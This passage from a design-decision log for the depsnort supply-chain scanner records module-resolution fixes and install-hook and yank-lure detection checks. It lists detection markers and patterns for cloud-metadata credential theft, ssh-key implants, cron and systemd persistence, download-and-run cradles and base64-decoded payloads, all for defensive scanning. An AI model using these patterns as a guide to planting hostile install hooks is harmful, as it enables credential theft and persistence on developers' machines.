Process: this change DOES alter resolution, so per the standing rule it did not
ship until the oracle agreed — three real repos (a heavy go 1.25 divergence case,
a heavy go 1.26 case, and a pre-1.17 no-regression case), each matched
module-for-module and version-for-version against `go list -m all`, plus a
synthetic unit case that separates correct pruning from both disproven shortcuts.

Scope of "exact" (see D-76): this proof is at the RESOLVER — `selectPruned`
seeded with a main module's own go.mod produces exactly Go's build list. A
`depsnort scan` of a local main module does not seed the resolver with the local
root (it is not proxy-queryable, per OPU-06); it resolves each of the root's
direct dependencies independently and takes the union, so the end-to-end scan is
a pruned-per-dependency SUPERSET of the build list, not the exact build list.
D-76 records the end-to-end acceptance and the residual over-approximation.

## D-76 — OPU-15 follow-up: pruning acceptance re-validated end-to-end; the scan is a pruned superset

Two field artifacts landed after D-75 merged: a regression test isolating a
pruning sub-rule, and a `go list -m all` acceptance oracle for opensnitch/daemon.
Acting on both surfaced an honest refinement of D-75's "exact" claim.

Sub-rule test (locked in). `selectPruned` carries an `unpruned` flag that a
`go <= 1.16` dependency sets and that must PROPAGATE through the `go 1.17+`
modules inside that dependency's subtree — otherwise a module reachable only via
those `go 1.17+` nodes is dropped. D-75's `TestResolverPrunedGraph` placed only
pre-1.17 modules inside the unpruned subtree, so a resolver that wrongly re-pruned
at a `go 1.17+` node inside an unpruned context would still pass it.
`TestResolverUnprunedSubtreeKeeps117Modules` closes that gap: R(1.20) → old(1.15)
→ modern(1.19) → leaf(1.19) → leafdep, where `leafdep` survives only if the flag
propagates through the two go 1.19 nodes. The merged resolver already passes it
(the `it.unpruned || selfUnpruned` term is correct); a mutation dropping
`it.unpruned` from the expand guard fails the new test while leaving
`TestResolverPrunedGraph` green — proof the test discriminates the exact
regression it names.

Acceptance oracle (committed). `testdata/opensnitch_daemon_golistmall.oracle` is
Go's own 64-module build list for opensnitch/daemon (go 1.25.0), spanning 14
distinct `go` directive levels, captured with `cd daemon && GOFLAGS=-mod=mod go
list -m all`. A default `depsnort scan` of that go.mod, re-run against the merged
code, CONTAINS all 64 modules at their exact versions (coverage 64/64), with the
discriminating anchor holding: cloud.google.com/go resolves to v0.26.0, NOT the
unpruned max v0.112.1 — pruning demonstrably engages.

Honest residual: that same scan produces ~170 gomod nodes, not 64. The extra
~106 are the union artifact D-75's "Scope of exact" note predicts — shared
modules at superseded versions (x/sys at 11, x/net at 8) and ~45 modules the real
build prunes away (e.g. github.com/docker/docker, pulled in because a direct
dependency is resolved as if it were the main module and its own pruned frontier
is kept). The build list is a subset of the scan (64 ⊆ 170): coverage is
guaranteed (no real module missed — the conservative direction for a scanner),
but surface is inflated, so a gomod finding can still land on a version the
project never ships. The over-approximation is far smaller than pre-pruning (170
vs 384) and the anchors prove pruning works where it most distorts, which is why
the field acceptance is framed as containment + anchors, not exact equality.

Exact end-to-end is future work (its own oracle-proven cycle — now done in D-77):
seed the resolver with the LOCAL main-module go.mod as the root require set (the
`go` directive and direct+indirect requires depsnort already parses) and resolve
the main module's build list as a whole, instead of unioning per-direct-dependency
resolutions. That collapses 170 → 64 and removes the false-surface modules. It
touches the OPU-06 boundary (the local root is deliberately not proxy-resolved),
so it is held for a dedicated change rather than folded in here. Until then the
residual stands recorded, not silently presented as the build.

## D-77 — OPU-15 exact: resolve a local main module's WHOLE build list (union → exact)

D-76's residual: a `depsnort scan` of a local Go main module produced a
pruned-per-dependency SUPERSET (opensnitch 170 gomod nodes vs Go's 64), because
the expansion resolved each of the root's direct dependencies independently and
unioned them. The union re-includes modules the real build prunes away (e.g.
github.com/docker/docker) and keeps a shared module at every version any single
dependency selects (x/sys at 11). This closes that gap: the scan now resolves the
main module's ENTIRE build list in one shot and matches `go list -m all` exactly.

Cause. The asserted tier resolves each registry-queryable coordinate's transitive
graph (D-44/OPU-06). The local project root has no proxy coordinate, so the walk
never resolved the main module as a whole — it aimed the resolver at each direct
dependency instead. Resolving a dependency as if IT were the main module keeps
that dependency's own pruned frontier and its independently-selected versions;
unioning many such resolutions over-approximates. The resolver was already exact
GIVEN a main module's require set (D-75, proven at the resolver); the pipeline
just never handed it the local root's require set.

Fix. A `LocalRootResolver` seam (internal/expand): the walker, before the
per-dependency path, offers the resolver the local root's parsed require set (the
go.mod `require` block — direct and recorded indirect — already depth-1 nodes) plus
its `go` directive. gomod's `ResolveLocalRoot` seeds minimal version selection
from that set exactly as the queried-coordinate path seeds from a fetched go.mod
(`selectBuildList` / `selectPrunedSeed` / `selectFullGraphSeed` are shared by
both entry points), walks the proxy for the rest, and returns the one-version-per-
module build list. The walker merges it with the same logic that merges a resolved
dependency (`mergeResolved`, extracted from AssertRoot — root stays observed, the
rest become asserted) and marks the whole reachable subtree expanded so the
presume walk does not re-derive it. Ecosystems whose resolver does not implement
the seam are untouched: the dispatcher returns ok=false and the per-dependency
path runs unchanged.

Proven exact against `go list -m all`, end to end (a full `depsnort scan`, not the
resolver in isolation):

```
opensnitch/daemon (go 1.25.0, pruned):   64/64 nodes EXACT (was 170), cloud.google.com/go v0.26.0
spf13/cobra       (go 1.12,  classic):  160/160 nodes EXACT (seeded selectFullGraphSeed)
```

The seeding concept was gated before any pipeline change: a throwaway harness fed
the daemon's local go.mod to the existing resolver via a proxy shim and matched
the 64-module oracle with 0 missing / 0 mismatched / 0 extra. Only then was the
seam built.

Orphans are the honest residual, not a regression. An exact build list contains
modules Go includes via a SUPERSEDED version's requirement (the D-73/OPU-14
phenomenon): the requiring version is not selected, so no selected module's go.mod
carries an edge to them, and they show as orphans (opensnitch 5, cobra 1). They
are correctly IN the build list at the correct version and are scanned for
advisories; only their root→node path is unavailable (Go answers the same "why"
through `go mod why -m`, tracing a superseded version). The union masked these by
carrying the superseded requirer versions as extra nodes — i.e. it hid an orphan
count behind an over-approximation. Fabricating a root edge to clear the metric
would over-claim a dependency that does not exist at the selected version, so the
orphans stand recorded (D-18), the same honesty D-24/D-76 apply elsewhere.

The D-76 disclosure note stays retired: the asserted Go closure is now the exact
build list end to end, and an offline / -no-depsdev run still falls back to the
presumed walk disclosed as presumed-only (D-70). Process: this changes resolution,
so per the standing rule it did not ship until the oracle agreed — two real repos
(a pruned go 1.25 case collapsing 170→64, a classic go 1.12 case at 160), each
matched module-for-module and version-for-version, plus resolver-level and
walker-level unit tests that separate the whole-root path from the union it
replaces.

## D-78 — OPU-17: a transient go.mod fetch failure degrades coverage, never shrinks the surface silently

The Go resolver's fetch seam collapsed two different outcomes into one `ok=false`:
a genuine 404 (the proxy's `outNotFound` — err == nil) and a TRANSIENT failure (its
`outGap` — a transport error, non-200 status, or read error, err != nil). Both
made the walk stop at that coordinate. For a 404 that is correct — the module
truly has no such record. For a transient failure it is a silent lie: the module's
subtree was UNREAD, not empty, so the build list came back smaller and looked
clean. Same scan, different results between runs; a module dropped by a network
blip is never evaluated for advisories. Observed this session as
`cloud.google.com/go@v0.54.0`'s direct require `bigquery@v1.4.0` — present on clean
runs, absent whenever the go-proxy fetch of its parent flaked. A scanner that
answers the same question differently across runs is failing a test a single run
cannot see (OPU-17).

The goproxy client already distinguished the two (a 404 carries no error; a
transient failure does); the resolver threw the distinction away. Now the fetcher
keeps it: on a transient error it records the coordinate as unread (still returning
ok=false — the walk genuinely cannot read past it), while a 404 stays a clean
not-found. `Resolve` / `ResolveLocalRoot` then return the partial build list with a
new `*expand.IncompleteResolution` error naming the unread coordinates (at their
selected versions). This is a THIRD outcome, deliberately distinct from both
existing ones: ok=false means "no answer, fall back to presume"; ok=true with a nil
error means "the complete build list"; ok=true with an IncompleteResolution means
"a real partial answer that must not be mistaken for the whole."

The walker consumes it without discarding the asserted work: `AssertRoot` and the
whole-root `assertLocalRoot` merge the partial graph, then mark each unread node a
frontier with `depsnort.subtree_unread = transient-fetch-failure` and fold the count
into the walk's `Unread` — the same coverage channel the presume walk already uses
for an unread coordinate (`res.Unread` → the `expand` data source's gaps → the
"coverage is incomplete" warning). Crucially the whole-root path does NOT fall back
to the per-dependency union on a transient failure: the union resolves against the
same flaky proxy and would hit the same hole while reintroducing the very
over-approximation D-77 removed. A degraded run is now a VISIBLY degraded run — a
marked node and a coverage gap — never a smaller graph passed off as an all-clear.

The distinction is honest about what it can and cannot recover: the unread module
itself stays in the build list (its version was recorded before the fetch), but its
dependencies are unknowable, so they are not fabricated — the hole is disclosed, not
filled. Deps.dev's resolver is unaffected (it never returns ok=true with a non-nil
error, so the merge-then-mark path is gomod-only).

Process: this changes resolution behavior, so per the standing rule it ships with
proof. The bug was reproduced first (a transient failure produced the same silent
drop as a 404), then the fix proven at two levels — the resolver distinguishes
transient from 404 (an `*IncompleteResolution` on the former, `nil` on the latter),
and the walker marks the node and degrades coverage. Both regression tests were
shown to have teeth by mutation: collapsing transient back into 404 fails the
transient tests while the 404 test stays green.

## D-79 — OPU-16: advisory/typosquat scoping is per-node, and per-node is correct (investigation, no fix)

The OPU-16 hand-off asked one question and forbade a fix until it was answered
against a planted advisory: do the advisory (VC-008) and typosquat (VC-006) checks
evaluate EVERY version present in the graph (per-node), or only the version a real
build selects (per-selected-version)? The worry was that a superseded, never-built
version carried as a node would draw a finding against an artifact the project does
not ship.

Answer: scoping is per-node / version-specific, end to end. `prefetchAdvisories`
queries OSV for every non-root node's exact (ecosystem, name, version) and keys the
result by node ID; VC-008, VC-001 and VC-006 each iterate `ctx.Graph.SortedNodes()`
and evaluate per node. A planted advisory confirms it empirically
(`vc008_opu16_test.go`): an advisory on `leftpad@1.0.0` where the graph also holds
`leftpad@2.0.0` fires on exactly the 1.0.0 node and no other; advisories on both
versions yield one finding each, with no per-name collapse that could mask a
version-specific CVE.

Per-node is the correct scoping, because the graph's nodes ARE the selected and
observed versions — there is no separate "build" to scope to. The exposure the
hand-off feared was real, but it was a symptom of the pre-OPU-15 UNION
over-approximation, which carried a module at many superseded versions as extra
nodes (opensnitch/daemon: 11 versions of golang.org/x/sys, 8 of x/net). D-75 and
D-77 removed it: the resolver now emits one node per module at its selected
build-list version (opensnitch re-measured post-D-77: 64 nodes, zero multi-version),
and the MVS reads superseded versions' go.mods (D-73) WITHOUT emitting them as
nodes. The D-77 "orphans" are not a counterexample — they are modules IN the build
list at their correct selected version, missing only a root->node edge, so scanning
them per-node is right. So the very over-approximation OPU-15 fought was also the
source of OPU-16's feared false-positive surface; closing the former closed the
latter.

Two residuals stand recorded, neither warranting the fix the hand-off held back:
  1. Presumed-tier nodes are advisory-scanned per-node like any other, so a
     presumed (guessed) version could draw an advisory that a different real build
     would not. This is not silent: presumed is a disclosed, non-gating truth tier
     (D-70, the version-truth axis), so such a finding already rests on a labelled
     guess, and demoting or hiding it would fight D-24's degrade-honestly rule.
  2. VC-006 is name-based but emits per node, so a genuinely multi-version graph
     (distinct roots pinning different versions of one squatted name) would surface
     one typosquat finding per version node — duplicate report noise, not a
     false positive, and it cannot arise from a single resolved root post-OPU-15.

Recommendation: no fix. Per-node scoping is correct for the resolved graph, and the
feared exposure was resolved as a side effect of OPU-15. If the field ever shows a
presumed-version advisory or a cross-version typosquat duplicate that matters in a
real report, revisit as its own scoped item — but do not pre-emptively re-scope a
correct behavior. Per the standing rule, this hand-off made no resolution change, so
it ships as an investigation record plus the planted-advisory regression that pins
the confirmed behavior; nothing was changed that an oracle needs to agree with.

## D-80 — OPU-19: VC-002 install-surface delta (A.I.G cross-map) — markers, IMDS-as-credential, VC-002g persistence

Cross-checking depSNORT's install-surface extractor against the AI-Infra-Guard
skill/MCP evasion patterns found it already covers the decode-exec, ssh-key, and
download-cradle shapes (and does the supply-chain slice better — graph-resolved,
not LLM-judged). The deltas were persistence surfacing, a few missing markers, and
cloud-IMDS credential recognition. Two gap classes: DETECTION gaps (a pattern the
analyzer never sees) and SURFACING gaps (a capability detected but no sub-check
raises it).

Part A — markers (detection gaps). `authorized_keys` (ssh-key implant) joins the
credential markers; `socket.getfqdn(` / `.getsockname(` join the env markers
alongside the existing `gethostname`; `systemctl` / `launchctl` / `launchd` join
the persistence markers alongside `crontab` / `systemd`. Each was invisible or
under-classified before and now fires its capability, frozen in the OPU-19 probe
table (TestOPU19InstallSurfaceProbeTable).

Part B — IMDS as credential, not bare network. A hook reaching a cloud
instance-metadata endpoint is reaching for cloud credentials. The IMDS host is
almost always inside a URL (`urlopen("http://169.254.169.254/…")`), and D-25's
URL strip — which correctly stops doc-URLs being read as behavior — removed the
host before credential scanning, so it fired only `network`. Fix: `imdsRe`
(`169.254.169.254`, `metadata.google.internal`, `metadata.azure.com`,
`/latest/meta-data/`) runs on the RAW source before the strip and elevates a match
to CapCredentials, so an IMDS reach raises VC-002c (or VC-002d with egress), not a
bland VC-002b. The bare hosts are also kept as credential markers — a cheap
backstop for a non-URL reference; the regex is the real fix. Proven: an IMDS URL
now resolves to `credentials+network` (was `network`).

Part C — VC-002g, install-hook persistence (surfacing gap, DECIDED yes). CapFilesystem
was detected but no sub-check consumed it. A library's install hook has no
legitimate reason to install a cron job, systemd/launchd service, shell-profile
hook, or Startup entry — that is an OS-package/admin action, not a build step
(A.I.G weights it as its own T06 category). VC-002g fires on the PERSISTENCE
subset of CapFilesystem — high severity, gate-eligible, closer to VC-002c than to
the common-and-benign VC-002b. The precision comes from splitting the filesystem
markers into `persistenceMarkers` (cron/service/profile/startup — the gate) and
`installWriteMarkers` (site-packages/.pth/gem dirs — ordinary writes, excluded).
Both remain CapFilesystem, so Part A's capability output is unchanged; the split
lives in the marker taxonomy (installsurface.IsPersistenceMarker), read by the
check via the hook's evidence, not in a new capability. A benign site-packages
write does not fire VC-002g — proven, and the exclusion shown to have teeth by
mutation (removing the gate false-positives on site-packages).

Part D — recon, DECIDED no standalone. CapEnv (gethostname/getfqdn/getsockname/
getuser/getnode) is detected but gets no standalone finding: benign installers
routinely read host/platform identity for telemetry, cache keys, and
platform-specific build selection, so a standalone recon finding would
false-positive at exactly the rate the tool's discipline avoids — the same reason
bare `process.env` is deliberately not treated as credentials (D upstream). Recon
is meaningful only as identity collected AND sent (gethostname → POST); if ever
surfaced it should be CapEnv+CapNetwork as an advisory (never gate-eligible),
mirroring VC-002d's shape. Deferred until there is a concrete FP budget for it. No
check consumes CapEnv, so the Part A env markers add coverage without adding a
finding — the decision is honored by construction.

Process: Part A/B were patch-and-proven by hermetic AnalyzePython probes per
pattern (the frozen table is that proof), and VC-002g by check-level tests
(persistence fires; a benign install write does not) whose exclusion was verified
by mutation. The eleven-pattern coverage map is frozen so it cannot silently
regress (acceptance §5).

## D-81 — OPU-26 (Increment 1): VC-012 yank-lure — pinned-to-yanked anchor + lure shape

The 2026-08-20 crates.io compromise (arrayref / proc-macro1) used a yank-lure: an
attacker with a taken-over maintainer account yanks the good releases and publishes
a malicious one as the newest LIVE version, so cargo's "use a version that is not
yanked" nudge funnels every consumer of a yanked version straight onto the payload.
depsnort had no substrate for it — `Release` carried no yank status, and nothing
consumed one.

Substrate. crates.io is the only one of the six registries that exposes a
per-version `yanked` flag in the metadata depsnort already fetches
(`/api/v1/crates/<crate>/versions`). So `Release` gains a `Yanked bool`, and the
cargo versions parser fills it — no new fetch, no new source. For every other
registry the flag stays false and means UNKNOWN, not "live", so the consumer scopes
itself to cargo (reading an always-false flag elsewhere would be a silent miss
dressed as clean, D-24).

The check (VC-012), scoped to what maps cleanly onto existing substrate this
increment. Two halves:
  - Anchor (concrete, low-FP): a resolved dependency pinned to a version the
    registry has yanked. A fresh resolution would refuse it; a lockfile carries it
    forward silently. Medium / advisory on its own — a hygiene note.
  - Elevation (the attack shape): when that crate's highest SEMVER version is LIVE
    and sits atop a contiguous run of >=2 yanked versions, the pinned-yanked
    consumer is standing exactly where the lure funnels an upgrade. High /
    gate-eligible, and the finding names the live-newest as the version to audit
    before upgrading rather than accepting cargo's nudge. Ordering is by semver, not
    publish time, because cargo resolves the nudge by version (0.3.10 > 0.3.9, not a
    lexical sort).

Scope of THIS increment, stated honestly. The introduced-dependency corroborators
the attack also leaves — a new build-kind dependency vs the last-good release, a
typosquat neighbour (proc-macro1 vs proc-macro2), a hostile build.rs — all live in
the live-newest version, which is NOT in the resolved graph (that is the whole point
of a lure: it targets the version you have not upgraded to yet). Reaching them needs
per-version dependency + build.rs enrichment of the live-newest, a later increment.
So VC-012 anchors on the concrete pinned-to-yanked fact and adds the lure shape as
context, rather than pretending to run the full composite over data it does not
have. The resolved-graph payload case (already on the malicious version) is
unchanged: a hostile build.rs there is VC-002's job.

Process: the yank field was proven against the real crates.io API (libc carries 9
genuinely-yanked versions in the same `/versions` response), and the check against
the arrayref shape plus negatives (single legit yank stays advisory, live pins stay
quiet, non-cargo ecosystems are ignored, semver ordering is not lexical).

## D-82 — OPU-26 (Increment 2): yank-lure live-newest enrichment — introduced build-dep + typosquat

Increment 1 (D-81) anchored VC-012 on the concrete pinned-to-yanked fact and flagged
the lure shape, but noted its real discriminators live in the live-newest version —
the one cargo nudges you toward, which is NOT in the resolved graph. This increment
reaches that version and adds the arrayref signature: the live-newest introduced a
NEW BUILD dependency that is a TYPOSQUAT of a popular crate (proc-macro1 vs
proc-macro2).

Substrate. crates.io tags each dependency with a kind; the cargo deps client already
fetched it but flattened build and normal together. CargoRequirement now carries
Kind, and IntroducedBuildDeps(baseline, newest) returns the build-deps present in
newest but not baseline — normal-kind additions ignored, because a new build-time
dependency (compile-time code execution) is the rare, suspicious event, not a new
normal dependency. The yank-lure shape detection moved onto ReleaseHistory
(YankLureShape / IsYanked) so the enrichment stage and the check share one
implementation.

Enrichment (orchestration, not the check). A targeted stage fetches the live-newest's
dependencies for ONLY the crates VC-012 would flag (pinned-to-yanked + lure shape) —
a handful of coordinates, not a walk — and records the introduced build-deps on the
node (yanklure.introduced_build_deps). It reuses the cargo-deps cache and the -offline
gate; a non-cargo scan does nothing, and the coverage line is emitted only when it
actually queried. The live-newest is deliberately NOT added to the resolved graph:
depsnort reports what the real build resolves to (D-77), and the lure target is a
version the project has not adopted — so it is enrichment for a finding, not a node.

Interpretation (the check). When the lure fires and the node carries introduced
build-deps, VC-012 names them and raises confidence; when one is a distance-1
near-miss of a high-reach crate (a focused, build-relevant cargo target list — NOT
the general VC-006 corpus, which does not yet cover cargo and is its own calibration),
it escalates to CRITICAL and names the impersonated crate. A legit new build-dep the
live-newest adds — cc, bindgen, a real popular crate — is a corpus MEMBER, not a
typosquat, so it stays at the lure shape's HIGH, not critical: "new build-dep" alone
is never the finding (the sketch's hard negative). The escalation is purely additive
specificity over Increment 1 — it adds no new false-positive surface, only a
critical tier for the exact attack shape.

Deferred to a later increment: the introduced dep's build.rs hostility (network +
tls-bypass/exec) needs the crate tarball, heavier machinery than metadata; and a
downloads-based "introduced dep is near-zero-reach" corroborator. The typosquat tell
is the highest-signal, lowest-cost half and is what this increment ships.

Process: CargoRequirement.Kind proven against the real crates.io /dependencies
endpoint (libsqlite3-sys carries build deps bindgen/cc/pkg-config/… tagged kind:build);
IntroducedBuildDeps and the escalation proven by unit tests — arrayref's
proc-macro1 => critical, a legit cc addition stays high, no enrichment stays high —
with the typosquat gate shown to have teeth by mutation (disabling it drops the
critical tier while the high/legit cases stay green).

## D-83 — OPU-26 (Increment 3): yank-lure build.rs payload — fetch the introduced dep's source

Increments 1-2 caught the yank-lure shape and its typosquatted introduced build-dep.
This increment reaches the payload itself: the introduced build-dep's build.rs, the
code that runs at compile time on the machine that upgrades onto the lure.

CrateSourceClient (new). It resolves the introduced build-dep's requirement to the
highest non-yanked published version, downloads that version's .crate from
static.crates.io, VERIFIES it against the SHA-256 crates.io publishes (fails closed
on mismatch or an absent digest), gunzips and untars it, and extracts the top-level
build.rs. Mirrors the PyPI sdist fetcher's safety: host-allowlisted to
static.crates.io, https-only, redirects refused, a 50 MB download cap and a 2 MB
per-file cap, and tar path-traversal refused. Reading a build script's TEXT is
static analysis, not execution (D-04).

Enrichment. For each introduced build-dep of a flagged crate (already rare), the
enrichment stage fetches its build.rs and records the ones that are hostile on the
node (yanklure.hostile_build_deps). Only the flagged crates are fetched.

Hostility, and the CapExec trap. A build.rs is hostile when it is a download-and-run
cradle, or pairs network egress with decode-obfuscation or named-credential access.
CapExec is deliberately NOT a trigger: installsurface.AnalyzeRust marks EVERY build.rs
CapExec because a build script executes by definition, so "network + exec" would flag
an ordinary build that fetches a prebuilt binary and invokes a compiler. The signal is
network paired with what a legitimate build has no reason to do — decode a blob, read
credentials — or a cradle outright. This was caught by a test: the first definition
false-positived on a plain prebuilt-fetch build.rs.

Analyzer gap closed on the way. The obfuscation detection recognized from_base64 and
b64decode but not the real Rust idiom base64::decode / general_purpose::…​.decode, so
the actual arrayref payload shape would have slipped through. Added those to the
structural decode regex — a general installsurface improvement (VC-002 benefits too),
proven not to disturb the OPU-19 frozen coverage table.

VC-012 escalation. A hostile introduced build.rs escalates the finding to CRITICAL and
fires even when the dep's name is NOT a typosquat — the build.rs is the payload, not a
name-similarity heuristic. The typosquat tell (Increment 2) and the build.rs tell
(here) are independent critical triggers; together they are the full arrayref signature.

Process: the fetch/verify/extract pipeline proven against the real static.crates.io
(cc-1.0.83's .crate SHA-256 matches crates.io's published checksum exactly) and by unit
tests with canned .crate archives (extraction, checksum-mismatch fails closed, yanked
skipped); the hostility gate by table test (cradle and network+decode fire; exec-only,
network-only, network+ambient-exec do not) shown to have teeth by mutation. gofmt/vet
clean, go test -race ./... green (33 packages).

The OPU-26 composite is now complete: Signal 1 (yank-lure shape), 2 (new build-dep),
3 (typosquat), 4 (hostile build.rs). The temporal snapshot-diff path remains the one
optional, unbuilt piece.

## D-84 — OPU-26 (Increment 4): PyPI yank-lure — the shape detection generalizes

VC-012 was cargo-scoped by construction (D-81) because cargo was the only ecosystem
whose Release.Yanked was populated. PyPI is the strongest cross-ecosystem parallel:
PEP 592 yank makes a yanked release un-selectable in a fresh pip resolution while
keeping it installable when EXACTLY pinned — the same "consumer of a yanked version
is nudged to the newest non-yanked release" mechanism cargo yank has, and PyPI
declares setup.py install hooks, so the payload half exists too.

Substrate. PyPI's JSON API already carried per-file `yanked` (PEP 592); the release
parser now reads it and marks a version yanked when EVERY file is yanked — while any
file stays live, pip can still resolve the version, so it is not effectively
withdrawn. Confirmed against real PyPI (urllib3 reports 1.25 / 1.25.1 / 2.0.0 / 2.0.1
fully yanked). No new fetch: the flag rides the metadata already pulled.

Check. VC-012's cargo hardcoding is replaced by yankLureRegistry(ecosystem), an
explicit allowlist of the registries that supply a per-version yanked flag —
{cargo, pypi} — returning the installer name and the install-hook file for the
wording (cargo/build.rs, pip/setup.py). Everywhere else Release.Yanked is always
false and means "unknown", so the check does not run: an allowlist, not a guess, is
the honest scope (D-24). The pinned-to-yanked anchor and the lure-shape elevation are
ecosystem-agnostic and now fire for PyPI with pip/setup.py in the text.

Scope of this increment. Only the SHAPE half generalizes here — a PyPI node gets the
pinned-to-yanked finding and the lure elevation, never the introduced-build-dep /
typosquat / hostile-build.rs escalations, which are cargo-specific (the enrichment
stage runs only for cargo, so those node attributes are simply absent for PyPI). The
PyPI payload analogue — the live-newest's setup.py hostility, which would reuse the
existing sdist fetcher and AnalyzeSetupPy rather than the crate machinery — is a
later increment, deliberately not folded in.

Process: the yanked parse proven against real PyPI JSON and a unit test (all-files
-yanked is yanked, one-live-file is not); the check by a pypi shape test (fires high
with pip/setup.py wording) and a repointed scope guard (npm — an ecosystem with no
yanked flag — stays quiet). gofmt/vet clean, go test -race ./... green (33 packages).

## D-85 — OPU-26 (Increment 5): PyPI yank-lure payload — the live-newest's setup.py

Increment 4 gave PyPI the yank-lure SHAPE; this gives it the payload half. Unlike
cargo — where the payload rides an INTRODUCED build-dependency's build.rs — a
malicious PyPI release usually ships the payload in its OWN setup.py, run by pip at
install. So the PyPI enrichment analyzes the live-newest version's setup.py directly,
rather than diffing dependencies.

Fetch. SdistFetcher already downloads and extracts a package version's setup.py
(digest-verified, host-allowlisted, size-capped — the machinery Increment 3 mirrored
for crates). A new exported SetupPySource(name, version) returns just the live-newest's
setup.py text; no new fetcher, no new network surface.

Enrichment restructured. enrichYankLure is now a dispatcher over the two yank-data
ecosystems: cargo keeps the introduced-build-dep + build.rs path (Increments 2-3);
pypi runs enrichPyPIYankLure, which fetches the live-newest's setup.py and, when it is
hostile, records yanklure.hostile_newest. Only flagged (rare) packages are fetched,
and the live-newest is NOT added to the resolved graph — it is enrichment for a
finding, the version the project has not adopted (D-77).

Hostility is shared. hostileBuildRS and the new hostileSetupPy both delegate to
hostileInstallCaps over an analyzed surface (AnalyzeRust / AnalyzePython): a cradle,
or network paired with decode-obfuscation or named-credential access. CapExec stays
excluded for both — AnalyzePython marks a setup.py CapExec ambiently (setup.py
executes by definition), the same trap the cargo build.rs analysis hit; the gate keys
on network + the things a legitimate install has no reason to do.

VC-012 escalation. A hostile live-newest setup.py escalates the PyPI finding to
CRITICAL on its own, independent of any dependency diff, with pip/setup.py wording via
yankLureRegistry. It is a separate trigger from the cargo introduced-build-dep tells,
which a PyPI node never carries.

Process: hostileSetupPy proven by table test (creds+net and decode+net fire; a plain
setup and a prebuilt-wheel fetch do not), sharing the CapExec-trap discipline; the
PyPI escalation by a VC-012 test shown to have teeth by mutation. gofmt/vet clean, go
test -race ./... green (33 packages). The yank-lure composite is now complete for both
supporting ecosystems — cargo (build.rs, via an introduced dep) and PyPI (setup.py, in
the release itself).

## D-86 — OPU-26 (Go): retract-lure — the shape generalizes to go.mod `retract`

The third registry that exposes a per-version withdrawal is Go. A module withdraws a
release with a `retract` directive in its go.mod; `go get -u` then refuses to upgrade a
consumer INTO a retracted version and `go list -m -u -retracted` flags one already
pinned. That is the same asymmetry crates.io yank and PyPI PEP 592 yank have — a fresh
resolution steers away from the withdrawn version while a go.sum carries it forward —
so the yank-lure shape applies: a consumer pinned into a contiguous retracted run sits
exactly where `go`'s "upgrade to a non-retracted version" nudge funnels toward the live
newest, the version an account-takeover attacker would publish the payload as.

Substrate reuse, no new signal. The Release.Yanked flag and ReleaseHistory.YankLureShape
/ IsYanked that back cargo and PyPI already carry the whole shape; Go only needed to
POPULATE Yanked. A new goproxy/retract.go parses `retract` directives — single version,
inclusive `[lo, hi]` range, and parenthesised block form — stripping `//` rationale
comments, comparing by semver (so v0.3.10 orders after v0.3.9, not lexically), and
degrading a malformed entry to "not retracted" rather than erroring. Go reads a module's
retractions from its HIGHEST version's go.mod, so histories.go fetches that one go.mod
(one extra cached GET, folded in serially before the per-version .info fan-out, so the
-race model is unchanged) and marks each release Yanked via isRetracted.

Shape-only, by nature. cargo and PyPI carry a payload corroborator (a hostile build.rs
on an introduced dep; a hostile setup.py in the release) because both have an install/
build hook an attacker plants code in. A Go module has NO discrete install hook — its
code simply runs on import — so there is nothing analogous to fetch-and-analyse, and the
Go finding is the shape advisory alone (medium anchor → high lure), never escalated to
critical. yankLureRegistry now returns a small struct ({installer, hook, verb, lure}) so
VC-012's evidence reads in each ecosystem's own words: Go says "retracted"/"retract-lure",
names the `go` installer, and — with an empty hook — points remediation at the module
code that runs on import rather than a build.rs/setup.py.

Process: parseRetract/isRetracted/highestVersion unit-tested (single/range/block, comment
stripping, semver-not-lexical bounds, the `retract`-as-prefix guard) and each shown to
have teeth by mutation (exclusive bound, verb swap, dropped guard all flip a test);
end-to-end Histories test proves a retract block flows through to Yanked and the
retract-lure YankLureShape; the VC-012 Go finding proven high with retract vocabulary and
no build/install-hook wording. Proven against a live oracle: github.com/prometheus/common
v1.20.99's real 37-entry retract block — every listed version reads retracted, every
unlisted one does not. gofmt/vet clean, go test -race ./... green.

## D-87 — OPU-27: install-surface coverage for package runners, manager installs, git-hook persistence

Origin: a live-fire assessment of the MoSLoF/meshclaw fork exercised the install-surface
analyzer against a populated dependency tree (17 hook nodes) and exposed three install-time
behaviors the VC-002 pattern set scored as inert — each a real code-execution or network
reach at a consumer's install time:

- **Package runner** (`npx` / `bunx`, and `pnpm`/`yarn`/`bun dlx`|`x`): fetch-and-execute a
  registry package in one step. `@meshtastic/core`'s `preinstall: npx only-allow pnpm` (and
  two siblings) scored a bare VC-002a "a hook exists" note. Now CapNetwork + CapExec →
  VC-002b. Unlike `curl | sh` this is the package manager's own resolution path, so it is
  NOT CapCradle.
- **Package-manager install** (`npm`/`pnpm`/`yarn`/`bun install|i|ci|add`, `pip`/`gem`/
  `cargo`/`go install`, `poetry add`, `uv pip install|add`): pulls third-party code from a
  registry during the hook. smart-buffer/socks' `prepublish: npm install -g typescript &&
  npm run build` scored exec-only (incidental). Now CapNetwork; any exec is scored
  independently by the exec markers.
- **Git-hook-path manipulation** (`core.hooksPath` redirect, direct `.git/hooks/` write):
  arranges code to auto-run on a future VCS event. Was invisible. Folded into
  persistenceMarkers → CapFilesystem + a persistence marker → VC-002g, exactly like cron /
  systemd / $PROFILE (OPU-19). No new capability, no new check ID.

All three are structural regexes in scanCaps, matching the existing cradle/obfuscated-scheme
pattern — text matched, never run (D-04). Capabilities route to the existing VC-002 checks.

The discipline is load-bearing, and its guards are proven by mutation (each flips a test):

- **Offline suppression.** `npx --no-install` / `--offline` / `--prefer-offline` resolve a
  local bin only — pkgRunnerOfflineRe suppresses the network capability. `pnpm exec` /
  `yarn exec` (run an already-installed bin) are excluded from the runner pattern entirely.
- **Install vs. run.** pkgInstallRe matches only `install|i|ci|add` subcommands. `npm run
  <script>` does not fetch and is never matched.
- **Husky exclusion.** Bare `husky` / `husky install` is deliberately NOT a persistence
  marker: it is the most common npm prepare script, runs only in a dev/git checkout (never a
  consumer's tarball install), and listing it would reintroduce exactly the warning tax the
  OPU-19 persistence-vs-benign split removed. Only the explicit `core.hooksPath` redirect and
  direct `.git/hooks/` writes trip VC-002g.

Proof: opu27_test.go asserts the quiet cases (node-gyp-build native compile, `npm run build`,
husky, offline runners, `pnpm exec`) as hard as the positives — a coverage patch that cannot
prove its own restraint is a regression waiting to happen. Each discipline guard shown to
